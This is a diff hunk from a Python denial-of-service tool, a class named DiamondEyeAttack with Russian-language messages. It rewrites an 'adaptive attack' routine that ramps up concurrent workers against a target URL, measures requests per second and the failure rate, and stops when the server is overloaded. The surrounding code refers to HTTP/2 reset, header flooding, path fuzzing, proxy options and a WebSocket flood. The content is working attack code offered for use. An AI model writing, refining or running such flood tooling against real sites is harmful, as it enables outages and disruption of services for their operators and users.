@@ -317,34 +317,41 @@ class DiamondEyeAttack:
 
     async def adaptive_attack(self):
         print(f"{Fore.CYAN}📈 Adaptive RPS: начали с {self.workers} воркеров{Style.RESET_ALL}")
-        while not self._shutdown_event.is_set():
-            self.current_workers = int(self.current_workers * (1 + self.adaptive_step))
-            print(f"{Fore.YELLOW}🔄 Увеличиваем до {self.current_workers} воркеров{Style.RESET_ALL}")
+        base_workers = self.workers
+        fail_history = []
 
-            temp_attack = DiamondEyeAttack(
-                url=self.url,
-                workers=self.current_workers,
-                sockets=self.sockets,
-                methods=self.methods,
-                useragents=self.useragents,
-                no_ssl_check=self.no_ssl_check,
-                debug=self.debug,
-                proxy=self.proxy,
-                use_http2=self.use_http2,
-                use_http3=self.use_http3,
-                auth=self.auth,
-                h2reset=self.h2reset,
-                flood=self.flood,
-                path_fuzz=self.path_fuzz,
-                header_flood=self.header_flood,
-                args=self.args
-            )
-            await temp_attack.start()
-            await asyncio.sleep(10)
-            fail_rate = temp_attack.failed / max(1, temp_attack.sent)
-            if fail_rate > 0.3:
-                print(f"{Fore.RED}🛑 Сервер не отвечает. Оптимальная нагрузка достигнута.{Style.RESET_ALL}")
+        for step in range(30):  # Максимум 30 шагов
+            if self._shutdown_event.is_set():
                 break
+
+            # Увеличиваем число воркеров (на 10% каждый шаг)
+            self.workers = max(1, int(base_workers * (1.1 ** len(fail_history))))
+            print(f"{Fore.YELLOW}🔄 Адаптив: {self.workers} воркеров | Шаг {step+1}{Style.RESET_ALL}")
+
+            # Краткая пауза перед статистикой
+            await asyncio.sleep(1.0)
+
+            # Замер RPS и ошибки за 10 секунд
+            start_sent = self.sent
+            start_failed = self.failed
+            await asyncio.sleep(10.0)
+
+            new_sent = self.sent - start_sent
+            new_failed = self.failed - start_failed
+            rps = int(new_sent / 10.0)
+            fail_rate = new_failed / max(1, new_sent)
+
+            print(f"{Fore.WHITE}📊 Текущий RPS: {rps} | Ошибки: {fail_rate:.1%}{Style.RESET_ALL}")
+
+            if fail_rate > 0.3:
+                print(f"{Fore.RED}🛑 Сервер перегружен. Оптимальная нагрузка: ~{int(rps * 0.9)} RPS{Style.RESET_ALL}")
+                break
+
+            fail_history.append(fail_rate)
+
+        # После остановки — просто выходим
+        print(f"{Fore.GREEN}✅ Адаптивная атака завершена{Style.RESET_ALL}")
+
 
     async def websocket_flood(self):
         print(f"{Fore.CYAN}🔗 WebSocket Flood: подключение к {self.url}...{Style.RESET_ALL}")
